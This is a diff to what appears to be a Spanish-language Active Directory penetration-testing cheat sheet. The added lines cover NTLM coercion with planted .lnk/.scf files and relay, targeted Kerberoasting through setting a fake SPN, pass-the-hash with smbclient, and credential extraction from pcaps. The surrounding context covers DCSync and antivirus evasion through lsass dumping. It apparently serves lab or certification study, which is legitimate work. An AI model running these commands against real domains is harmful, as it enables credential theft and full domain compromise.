@@ -106,6 +106,7 @@ kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-
 > ldapsearch -x -H ldap://$IP -b "DC=corp,DC=local" > ldap_dump.txt
 > grep -i -E "descr|pass|pwd|comment|info|key|secret" ldap_dump.txt
 > ```
+> 🔴 **Share con ESCRITURA pero sin shell = coerción NTLM** (Laser): deja un archivo que fuerce autenticación (`.lnk`, `.url`, `.scf`, `.library-ms` — genéralos de golpe con `ntlm_theft`) y espera a que un proceso/usuario del dominio navegue por el share. Solo quieres el hash → `Responder` (crackéalo). Quieres **ejecutar** como esa cuenta → **relay** con `ntlmrelayx` (apaga SMB y HTTP de Responder antes, chocan de puerto). Detalle en [`6b`](6b-AD-Referencia-Detallada.md) FASE 2b.
 
 **→ Conseguí:** lista de usuarios → **P2** · una credencial (web/share) → **P3** · el DC no responde → **túnel**.
 
@@ -288,6 +289,11 @@ bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add groupMember "GRUPO_OBJETIVO
 # Shadow Credentials (GenericWrite/AddKeyCredentialLink) — sin tocar su pass, te da TGT + hash NT
 certipy shadow auto -u $USER@$DOMAIN -p $PASS -account victima -dc-ip $DC
 
+# Targeted Kerberoasting (GenericWrite sobre un USUARIO sin SPN) — Laser: le PONES un SPN, roasteas, se lo quitas
+bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set object victima servicePrincipalName -v 'fake/svc'
+impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request-user victima -outputfile kerb.txt   # hashcat -m 13100
+bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC remove object victima servicePrincipalName -v 'fake/svc'  # limpia
+
 # WriteDacl sobre el dominio → auto-DCSync
 bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add dcsync $USER
 impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt      # → P9
@@ -431,6 +437,9 @@ evil-winrm -i $DC -u Administrator -H NTHASH
 | Caracteres raros / "UTF-16" al pegar un hash/pass | Archivo en UTF-16 (reg/PowerShell). `iconv -f UTF-16 -t UTF-8 in > out` o `dos2unix`. |
 | `bloodhound-python` falla por DNS | Añade `-ns $DC` y `-dc $DCHOST` y revisa `/etc/hosts`. |
 | No alcanzo el DC / una 2ª subred | No es posición nueva: es red. Monta un **túnel** (ligolo/chisel). |
+| `xfreerdp` ignora `/cert-ignore` y aún pide confirmar / falla | **xfreerdp3** cambió la sintaxis a dos puntos: `/cert:ignore` (no `/cert-ignore`). Igual `/sec:nla`, `/drive:...`. |
+| Tengo un `.pcap` del enunciado y no sé qué mirar | Las creds suelen ir en claro. `tshark -r f.pcap -V \| grep -iE "pass\|pwd\|form item\|NTLM"`, o filtra `http.request.method==POST` / `ftp`. Detalle en `6b` FASE 2. |
+| Tengo el hash NT y `smbclient` no me deja montar el share | Pásalo directo: `smbclient //$IP/share -U '$USER' --pw-nt-hash '<NTHASH>'` (solo la mitad NT, sin `LM:`). Para ejecutar usa psexec/wmiexec `-hashes`. |
 | Spraying bloquea cuentas | Te pasaste del lockout. `getdompwinfo`, 1 intento por ventana, usa `kerbrute`. |
 | El binario (mimikatz/winPEAS) lo come el AV | Vuelca lsass a archivo y parsea en Kali (pypykatz), o `reg save`+secretsdump. Living off the land. |
 | `nxc` devuelve vacío | Sin conexión (VPN caída / máquina parada / IP mal), **no** es "hash caducado" (eso es `[-] LOGON_FAILURE`). |
